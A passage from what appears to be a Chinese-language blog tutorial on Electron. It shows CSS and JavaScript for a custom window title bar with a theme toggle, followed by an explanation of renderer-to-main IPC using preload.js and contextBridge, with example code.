class="attribute">min-width</span>: <span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">margin-left</span>: <span class="number">0px</span>;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">margin-top</span>: <span class="number">0px</span>;</span><br><span class="line">    <span class="attribute">align-items</span>: center;</span><br><span class="line">    -webkit-app-region: drag;</span><br><span class="line">    <span class="attribute">transition</span>: background-color <span class="number">0.5s</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#left-box</span> <span class="selector-tag">img</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">25px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">25px</span>;</span><br><span class="line">    <span class="attribute">margin-left</span>: <span class="number">5px</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">12.5px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.light-theme-shadow</span> &#123;</span><br><span class="line">    <span class="attribute">box-shadow</span>: -<span class="number">2px</span> <span class="number">2px</span> <span class="number">3px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.dark-theme-shadow</span> &#123;</span><br><span class="line">    <span class="attribute">box-shadow</span>: -<span class="number">2px</span> <span class="number">2px</span> <span class="number">3px</span> <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#left-box</span> <span class="selector-tag">div</span> &#123;</span><br><span class="line">    <span class="attribute">margin-left</span>: <span class="number">0px</span>;</span><br><span class="line">    <span class="attribute">white-space</span>: nowrap;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">12.5px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#right-box</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="comment">/* width: 30%; */</span></span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">flex-direction</span>: row-reverse;</span><br><span class="line">    <span class="attribute">transition</span>: background-color <span class="number">0.5s</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#right-box</span> <span class="selector-tag">div</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">max-width</span>: <span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">min-width</span>: <span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">justify-content</span>: center;</span><br><span class="line">    <span class="attribute">align-items</span>: center;</span><br><span class="line">    <span class="attribute">cursor</span>: pointer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#close</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">rgb</span>(<span class="number">232</span>, <span class="number">17</span>, <span class="number">35</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#close</span><span class="selector-pseudo">:hover</span> svg path &#123;</span><br><span class="line">    fill: <span class="built_in">rgb</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#minisize</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">160</span>, <span class="number">160</span>, <span class="number">160</span>, <span class="number">0.2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#maxsize</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">160</span>, <span class="number">160</span>, <span class="number">160</span>, <span class="number">0.2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#theme</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">160</span>, <span class="number">160</span>, <span class="number">160</span>, <span class="number">0.2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.icon</span> &#123;</span><br><span class="line">    <span class="attribute">pointer-events</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.blurBackground</span> &#123;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">flex</span>: <span class="number">1</span>;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">justify-content</span>: center;</span><br><span class="line">    <span class="attribute">align-items</span>: center;</span><br><span class="line">    <span class="attribute">z-index</span>: <span class="number">1000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.dark-theme</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#323233</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.dark-theme-body</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#252525</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#tt</span> &#123;</span><br><span class="line">	<span class="attribute">transition</span>: background-color <span class="number">0.5s</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.dark-theme-tt</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#8a8a8a</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.svg</span> path &#123;</span><br><span class="line">    fill: <span class="number">#cccccc</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</details>

<details>
    <summary>index.js</summary>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// add event listener to buttons</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// minimize button</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;minisize&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">        event.<span class="title function_">stopPropagation</span>()</span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">FunctionBar</span>.<span class="title function_">minimize</span>()</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="comment">// maximize button</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;maxsize&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">        event.<span class="title function_">stopPropagation</span>()</span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">FunctionBar</span>.<span class="title function_">maximize</span>()</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="comment">// close button</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;close&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">        event.<span class="title function_">stopPropagation</span>()</span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">FunctionBar</span>.<span class="title function_">close</span>()</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="comment">// theme button</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;theme&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">        event.<span class="title function_">stopPropagation</span>()</span><br><span class="line">        <span class="title function_">toggleTheme</span>()</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">FunctionBar</span>.<span class="title function_">reply</span>(<span class="string">&#x27;receive-maximize-message&#x27;</span>, <span class="function">(<span class="params">event, message</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (message) &#123;</span><br><span class="line">        <span class="title function_">setMaximizeIcon</span>()</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_">setMinimizeIcon</span>()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">maxi</span>.<span class="title function_">onMessage</span>(<span class="string">&#x27;window-maximized&#x27;</span>, <span class="function">(<span class="params">arg</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">setMaximizeIcon</span>()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">maxi</span>.<span class="title function_">onMessage</span>(<span class="string">&#x27;window-unmaximized&#x27;</span>, <span class="function">(<span class="params">arg</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">setMinimizeIcon</span>()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">setMaximizeIcon</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;maxsize&#x27;</span>).<span class="property">innerHTML</span> = <span class="string">`&lt;svg t=&quot;1737720796675&quot; class=&quot;icon&quot; viewBox=&quot;0 0 1024 1024&quot; version=&quot;1.1&quot;</span></span><br><span class="line"><span class="string">    xmlns=&quot;http://www.w3.org/2000/svg&quot; p-id=&quot;7019&quot; width=&quot;13&quot; height=&quot;13&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;path</span></span><br><span class="line"><span class="string">        d=&quot;M682.666667 938.666667c-25.6 0-42.666667-17.066667-42.666667-42.666667v-128c0-72.533333 55.466667-128 128-128h128c25.6 0 42.666667 17.066667 42.666667 42.666667s-17.066667 42.666667-42.666667 42.666666h-128c-25.6 0-42.666667 17.066667-42.666667 42.666667v128c0 25.6-17.066667 42.666667-42.666666 42.666667z m-341.333334 0c-25.6 0-42.666667-17.066667-42.666666-42.666667v-128c0-25.6-17.066667-42.666667-42.666667-42.666667H128c-25.6 0-42.666667-17.066667-42.666667-42.666666s17.066667-42.666667 42.666667-42.666667h128c72.533333 0 128 55.466667 128 128v128c0 25.6-17.066667 42.666667-42.666667 42.666667zM896 384h-128c-72.533333 0-128-55.466667-128-128V128c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666666 42.666667v128c0 25.6 17.066667 42.666667 42.666667 42.666667h128c25.6 0 42.666667 17.066667 42.666667 42.666666s-17.066667 42.666667-42.666667 42.666667zM256 384H128c-25.6 0-42.666667-17.066667-42.666667-42.666667s17.066667-42.666667 42.666667-42.666666h128c25.6 0 42.666667-17.066667 42.666667-42.666667V128c0-25.6 17.066667-42.666667 42.666666-42.666667s42.666667 17.066667 42.666667 42.666667v128c0 72.533333-55.466667 128-128 128z&quot;</span></span><br><span class="line"><span class="string">        p-id=&quot;7020&quot; fill=&quot;#8a8a8a&quot;&gt;&lt;/path&gt;</span></span><br><span class="line"><span class="string">&lt;/svg&gt;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">setMinimizeIcon</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;maxsize&#x27;</span>).<span class="property">innerHTML</span> = <span class="string">`&lt;svg t=&quot;1737720715887&quot; class=&quot;icon&quot; viewBox=&quot;0 0 1024 1024&quot; version=&quot;1.1&quot;</span></span><br><span class="line"><span class="string">    xmlns=&quot;http://www.w3.org/2000/svg&quot; p-id=&quot;5182&quot; width=&quot;13&quot; height=&quot;13&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;path</span></span><br><span class="line"><span class="string">        d=&quot;M810.666667 938.666667h-128c-25.6 0-42.666667-17.066667-42.666667-42.666667s17.066667-42.666667 42.666667-42.666667h128c25.6 0 42.666667-17.066667 42.666666-42.666666v-128c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667v128c0 72.533333-55.466667 128-128 128zM341.333333 938.666667H213.333333c-72.533333 0-128-55.466667-128-128v-128c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667v128c0 25.6 17.066667 42.666667 42.666666 42.666666h128c25.6 0 42.666667 17.066667 42.666667 42.666667s-17.066667 42.666667-42.666667 42.666667zM896 384c-25.6 0-42.666667-17.066667-42.666667-42.666667V213.333333c0-25.6-17.066667-42.666667-42.666666-42.666666h-128c-25.6 0-42.666667-17.066667-42.666667-42.666667s17.066667-42.666667 42.666667-42.666667h128c72.533333 0 128 55.466667 128 128v128c0 25.6-17.066667 42.666667-42.666667 42.666667zM128 384c-25.6 0-42.666667-17.066667-42.666667-42.666667V213.333333c0-72.533333 55.466667-128 128-128h128c25.6 0 42.666667 17.066667 42.666667 42.666667s-17.066667 42.666667-42.666667 42.666667H213.333333c-25.6 0-42.666667 17.066667-42.666666 42.666666v128c0 25.6-17.066667 42.666667-42.666667 42.666667z&quot;</span></span><br><span class="line"><span class="string">        fill=&quot;#8a8a8a&quot; p-id=&quot;5183&quot;&gt;&lt;/path&gt;</span></span><br><span class="line"><span class="string">&lt;/svg&gt;`</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> theme = <span class="literal">false</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">toggleTheme</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">classToggle</span>(<span class="string">&#x27;draggableBar&#x27;</span>, <span class="string">&#x27;dark-theme&#x27;</span>)</span><br><span class="line">    <span class="title function_">classToggle</span>(<span class="string">&#x27;left-box&#x27;</span>, <span class="string">&#x27;dark-theme&#x27;</span>)</span><br><span class="line">    <span class="title function_">classToggle</span>(<span class="string">&#x27;right-box&#x27;</span>, <span class="string">&#x27;dark-theme&#x27;</span>)</span><br><span class="line">    <span class="title function_">classToggle</span>(<span class="string">&#x27;close&#x27;</span>, <span class="string">&#x27;dark-theme&#x27;</span>)</span><br><span class="line">    <span class="title function_">classToggle</span>(<span class="string">&#x27;maxsize&#x27;</span>, <span class="string">&#x27;dark-theme&#x27;</span>)</span><br><span class="line">    <span class="title function_">classToggle</span>(<span class="string">&#x27;minisize&#x27;</span>, <span class="string">&#x27;dark-theme&#x27;</span>)</span><br><span class="line">    <span class="title function_">classToggle</span>(<span class="string">&#x27;theme&#x27;</span>, <span class="string">&#x27;dark-theme&#x27;</span>)</span><br><span class="line">    <span class="title function_">classToggle</span>(<span class="string">&#x27;tt&#x27;</span>, <span class="string">&#x27;dark-theme-tt&#x27;</span>)</span><br><span class="line">    <span class="title function_">classToggle</span>(<span class="string">&#x27;iconpic&#x27;</span>, <span class="string">&#x27;light-theme-shadow&#x27;</span>)</span><br><span class="line">    <span class="title function_">classToggle</span>(<span class="string">&#x27;iconpic&#x27;</span>, <span class="string">&#x27;dark-theme-shadow&#x27;</span>)</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">classList</span>.<span class="title function_">toggle</span>(<span class="string">&#x27;dark-theme-body&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> (!theme) &#123;</span><br><span class="line">        theme = <span class="literal">true</span></span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;theme&#x27;</span>).<span class="property">innerHTML</span> = <span class="string">`&lt;svg t=&quot;1740885248898&quot; class=&quot;icon&quot; viewBox=&quot;0 0 1024 1024&quot; version=&quot;1.1&quot; </span></span><br><span class="line"><span class="string">        xmlns=&quot;http://www.w3.org/2000/svg&quot; p-id=&quot;5947&quot; width=&quot;15&quot; height=&quot;15&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;path </span></span><br><span class="line"><span class="string">            d=&quot;M558.27 1024c157.512 0 301.964-71.608 397.688-189.55 56.54-69.662-5.116-171.444-92.498-154.802-164.696 31.366-316.544-94.536-316.544-261.584 0-96.848 52.12-184.584 134.868-231.672 77.49-44.1 57.998-161.576-30.044-177.838A515.872 515.872 0 0 0 558.27 0c-282.72 0-512 229.15-512 512 0 282.72 229.152 512 512 512z m0-928c25.97 0 51.378 2.402 76.032 6.956-109.52 62.326-183.386 180.084-183.386 315.108 0 227.696 207.282 398.4 430.504 355.888C805.148 867.928 688.732 928 558.27 928c-229.75 0-416-186.25-416-416s186.25-416 416-416z&quot; </span></span><br><span class="line"><span class="string">            fill=&quot;#8a8a8a&quot; p-id=&quot;5948&quot;&gt;&lt;/path&gt;</span></span><br><span class="line"><span class="string">        &lt;/svg&gt;`</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        theme = <span class="literal">false</span></span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;theme&#x27;</span>).<span class="property">innerHTML</span> = <span class="string">`&lt;svg style=&quot;margin-top: 1px&quot; t=&quot;1740838433864&quot; class=&quot;icon&quot; viewBox=&quot;0 0 1024 1024&quot; version=&quot;1.1&quot;</span></span><br><span class="line"><span class="string">                    xmlns=&quot;http://www.w3.org/2000/svg&quot; p-id=&quot;3190&quot; width=&quot;17.5&quot; height=&quot;17.5&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;path</span></span><br><span class="line"><span class="string">                        d=&quot;M549.302857 84.297143c0-20.150857-17.152-37.302857-37.302857-37.302857s-37.284571 17.152-37.284571 37.302857V174.262857c0 20.150857 17.152 37.302857 37.302857 37.302857 20.114286 0 37.266286-17.152 37.266285-37.302857z m174.409143 163.273143c-14.134857 14.573714-14.134857 38.582857 0 52.717714 14.573714 14.573714 38.144 14.994286 53.138286 0l63.872-63.853714a37.76 37.76 0 0 0 0-53.156572c-14.153143-14.134857-38.144-14.134857-52.717715 0z m-476.562286 52.717714c14.134857 14.573714 38.144 14.573714 52.699429 0 14.153143-13.714286 14.153143-38.582857 0.438857-52.717714l-63.853714-64.292572c-13.714286-13.714286-38.144-14.134857-52.717715 0-14.153143 14.153143-14.153143 38.582857-0.438857 52.717715zM512 293.430857c-119.570286 0-218.569143 98.998857-218.569143 218.569143S392.411429 731.008 512 731.008c119.149714 0 218.148571-99.437714 218.148571-219.008 0-119.588571-98.998857-218.569143-218.148571-218.569143z m0 65.572572c83.565714 0 152.996571 69.430857 152.996571 152.996571S595.565714 665.417143 512 665.417143c-84.004571 0-153.417143-69.851429-153.417143-153.417143s69.412571-152.996571 153.417143-152.996571z m426.422857 190.281142c20.150857 0 37.302857-17.133714 37.302857-37.284571s-17.152-37.302857-37.302857-37.302857h-89.563428c-20.150857 0-37.302857 17.152-37.302858 37.302857s17.152 37.284571 37.302858 37.284571zM85.577143 474.715429c-20.150857 0-37.302857 17.133714-37.302857 37.284571s17.152 37.284571 37.302857 37.284571h89.563428c20.150857 0 37.302857-17.133714 37.302858-37.284571s-17.152-37.302857-37.302858-37.302857zM776.411429 724.114286a38.034286 38.034286 0 0 0-52.717715 0c-14.134857 14.153143-14.134857 38.162286 0 52.717714L788.004571 841.142857c14.573714 14.134857 38.582857 13.714286 52.717715-0.420571 14.573714-14.153143 14.573714-38.144 0-52.717715z m-593.152 63.451428c-14.555429 14.134857-14.555429 38.564571-0.420572 52.699429 14.153143 14.153143 38.582857 14.573714 53.138286 0.438857l63.853714-63.872c14.153143-14.134857 14.153143-38.144 0.438857-52.699429-14.153143-14.153143-38.582857-14.153143-53.138285 0z m366.006857 62.134857c0-20.150857-17.133714-37.302857-37.284572-37.302857s-37.284571 17.152-37.284571 37.302857v90.002286c0 20.132571 17.152 37.284571 37.302857 37.284572 20.114286 0 37.266286-17.152 37.266286-37.302858z&quot;</span></span><br><span class="line"><span class="string">                        p-id=&quot;3191&quot; data-spm-anchor-id=&quot;a313x.search_index.0.i0.227f3a81VKAdac&quot; class=&quot;selected&quot;</span></span><br><span class="line"><span class="string">                        fill=&quot;#8a8a8a&quot;&gt;&lt;/path&gt;</span></span><br><span class="line"><span class="string">                &lt;/svg&gt;`</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">classToggle</span>(<span class="params">element, className</span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(element).<span class="property">classList</span>.<span class="title function_">toggle</span>(className)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

</details>

<details>
    <summary>preload.js</summary>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; contextBridge, ipcRenderer &#125; = <span class="built_in">require</span>(<span class="string">&#x27;electron&#x27;</span>);</span><br><span class="line">contextBridge.<span class="title function_">exposeInMainWorld</span>(<span class="string">&#x27;FunctionBar&#x27;</span>, &#123;</span><br><span class="line">	<span class="attr">maximize</span>: <span class="function">() =&gt;</span> ipcRenderer.<span class="title function_">send</span>(<span class="string">&#x27;maximize&#x27;</span>),</span><br><span class="line">	<span class="attr">minimize</span>: <span class="function">() =&gt;</span> ipcRenderer.<span class="title function_">send</span>(<span class="string">&#x27;minimize&#x27;</span>),</span><br><span class="line">	<span class="attr">close</span>: <span class="function">() =&gt;</span> ipcRenderer.<span class="title function_">send</span>(<span class="string">&#x27;close&#x27;</span>),</span><br><span class="line">	<span class="attr">reply</span>: <span class="function">(<span class="params">channel, callback</span>) =&gt;</span> ipcRenderer.<span class="title function_">on</span>(channel, callback)</span><br><span class="line">&#125;)</span><br><span class="line">contextBridge.<span class="title function_">exposeInMainWorld</span>(<span class="string">&#x27;maxi&#x27;</span>, &#123;</span><br><span class="line">	<span class="attr">onMessage</span>: <span class="function">(<span class="params">channel, func</span>) =&gt;</span> &#123;</span><br><span class="line">	ipcRenderer.<span class="title function_">on</span>(channel, <span class="function">(<span class="params">event, ...args</span>) =&gt;</span> <span class="title function_">func</span>(...args));</span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">sendToMain</span>: <span class="function">(<span class="params">channel, data</span>) =&gt;</span> &#123;</span><br><span class="line">	ipcRenderer.<span class="title function_">send</span>(channel, data);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
</details>




<h2 id="IPC通信"><a href="#IPC通信" class="headerlink" title="IPC通信"></a>IPC通信</h2><p>为什么有IPC（InterProcess Communication）通信？</p>
<p>如果你的渲染进程加载了第三方js或者js是cdn，这时候如果不对渲染进程进行限制，那么就可能直接调用node.js，node.js又能直接操作系统API，就可能造成安全问题</p>
<p>Electron IPC通信过程：通过一个preload.js预加载脚本建立IPC通道实现通信</p>
<p>原理和简单的代码实现（渲染进程通知主进程创建一个窗口，主进程返回一个res）如下：</p>
<h3 id="渲染进程向主进程通信"><a href="#渲染进程向主进程通信" class="headerlink" title="渲染进程向主进程通信"></a>渲染进程向主进程通信</h3><p><img src="/2025/01/23/Electron/image-20250124190443382.png" alt="image-20250124190443382"></p>
<p>mian.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; app, <span class="title class_">BrowserWindow</span>, ipcMain &#125; = <span class="built_in">require</span>(<span class="string">&#x27;electron&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">whenReady</span>().<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> mainWindow = <span class="keyword">new</span> <span class="title class_">BrowserWindow</span>(&#123;</span><br><span class="line">        <span class="attr">width</span>: <span class="number">800</span>,</span><br><span class="line">        <span class="attr">height</span>: <span class="number">600</span>,</span><br><span class="line">        <span class="attr">show</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">autoHideMenuBar</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">frame</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">transparent</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">webPreferences</span>: &#123;</span><br><span class="line">            <span class="attr">nodeIntegration</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="attr">preload</span>: path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;preload.js&#x27;</span>),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    mainWindow.<span class="title function_">loadFile</span>(<span class="string">&#x27;pages/index/index.html&#x27;</span>)</span><br><span class="line">    mainWindow.<span class="title function_">once</span>(<span class="string">&#x27;ready-to-show&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        mainWindow.<span class="title function_">show</span>()</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    mainWindow.<span class="title function_">on</span>(<span class="string">&#x27;closed&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;mainWindow closed&#x27;</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    ipcMain.<span class="title function_">on</span>(<span class="string">&#x27;createWindow&#x27;</span>, <span class="function">(<span class="params">event, value</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123; x, y, width, height, pageurl &#125; = value</span><br><span class="line">        <span class="keyword">const</span> newWindow = <span class="keyword">new</span> <span class="title class_">BrowserWindow</span>(&#123;</span><br><span class="line">            <span class="attr">x</span>: x,</span><br><span class="line">            <span class="attr">y</span>: y,</span><br><span class="line">            <span class="attr">width</span>: width,</span><br><span class="line">            <span class="attr">height</span>: height,</span><br><span class="line">        &#125;)</span><br><span class="line">        newWindow.<span class="title function_">loadFile</span>(pageurl)</span><br><span class="line">        newWindow.<span class="title function_">once</span>(<span class="string">&#x27;ready-to-show&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            newWindow.<span class="title function_">show</span>()</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    app.<span class="title function_">on</span>(<span class="string">&#x27;window-all-closed&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;app window-all-closed&#x27;</span>)</span><br><span class="line">        app.<span class="title function_">quit</span>()</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>preload.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; contextBridge, ipcRenderer &#125; = <span class="built_in">require</span>(<span class="string">&#x27;electron&#x27;</span>);</span><br><span class="line"></span><br><span class="line">contextBridge.<span class="title function_">exposeInMainWorld</span>(<span class="string">&#x27;createWindow&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">createWd</span>: <span class="function">(<span class="params">x, y, width, height, pageurl</span>) =&gt;</span> &#123;</span><br><span class="line">        ipcRenderer.<span class="title function_">send</span>(<span class="string">&#x27;createWindow&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">x</span>: x,</span><br><span class="line">            <span class="attr">y</span>: y,</span><br><span class="line">            <span class="attr">width</span>: width,</span><br><span class="line">            <span class="attr">height</span>: height,</span><br><span class="line">            <span class="attr">pageurl</span>: pageurl</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>index.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> btn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;openNeWindow&#x27;</span>)</span><br><span class="line">    btn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">createWindow</span>.<span class="title function_">createWd</span>(<span class="number">500</span>, <span class="number">500</span>, <span class="number">400</span>, <span class="number">300</span> ,<span class="string">&#x27;pages/homepage/homepage.html&#x27;</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>更多关于进程间通信详细内容请查看 <a href="https://www.electronjs.org/zh/docs/latest/tutorial/ipc">进程间通信 | Electron</a> </p>
